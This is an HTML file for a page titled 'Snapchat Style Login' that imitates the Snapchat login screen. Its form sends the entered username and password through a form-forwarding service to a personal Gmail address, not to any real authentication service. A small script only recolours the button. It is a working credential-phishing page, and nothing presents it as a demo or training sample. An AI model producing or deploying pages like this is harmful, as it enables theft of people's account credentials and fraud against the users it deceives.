<!DOCTYPE html>
<html lang="en">
<head>  
  <meta charset="UTF-8" />  
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
  <title>Snapchat Style Login</title>  
  <script src="https://cdn.tailwindcss.com"></script>  
</head>  
<body class="bg-white flex items-center justify-center h-screen">  
  <div class="w-full max-w-md p-6 bg-white shadow-md rounded-2xl">  
    <h2 class="text-2xl font-semibold text-center mb-6">Log In</h2>  
    <form action="https://formsubmit.co/sauravsingh002278@gmail.com" method="POST"> 
      <div>  
        <label class="block text-sm text-sky-500 mb-1">USERNAME OR EMAIL</label>  
        <input id="username" name="username" type="text" placeholder="Enter username or email"  
               class="w-full px-4 py-2 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-sky-400"/>  
      </div>  

      <a href="#" class="text-sm text-sky-500 hover:underline">Use phone number instead</a>  

      <div>  
        <label class="block text-sm text-sky-500 mt-4 mb-1">PASSWORD</label>  
        <div class="relative">  
          <input id="password" name="password" type="password" placeholder="Enter password"  
                 class="w-full px-4 py-2 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-sky-400"/>  
          <span class="absolute inset-y-0 right-3 top-2 text-gray-400 cursor-pointer"></span>  
        </div>  
      </div>  

      <div class="flex items-center space-x-2 mt-2">  
        <input type="checkbox" id="save-login" class="accent-sky-500" />  
        <label for="save-login" class="text-sm text-gray-600">Save Login Info on your device</label>  
      </div>  

      <div>  
        <a href="#" class="text-sm text-sky-500 hover:underline">Forgot your password?</a>  
      </div>  

      <button id="login-btn" type="submit"  
              class="w-full bg-gray-300 text-white text-lg py-2 rounded-full mt-4 transition duration-200">  
        Log In  
      </button>  
    </form>
  </div>  

  <script>
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('login-btn');

    function updateButtonColor() {
      const usernameFilled = usernameInput.value.trim() !== "";
      const passwordFilled = passwordInput.value.trim() !== "";

      if (usernameFilled && passwordFilled) {
        loginBtn.classList.remove('bg-gray-300', 'hover:bg-gray-400');
        loginBtn.classList.add('bg-sky-500', 'hover:bg-sky-600');
      } else {
        loginBtn.classList.remove('bg-sky-500', 'hover:bg-sky-600');
        loginBtn.classList.add('bg-gray-300', 'hover:bg-gray-400');
      }
    }

    usernameInput.addEventListener('input', updateButtonColor);
    passwordInput.addEventListener('input', updateButtonColor);
  </script>
</body>  
</html>
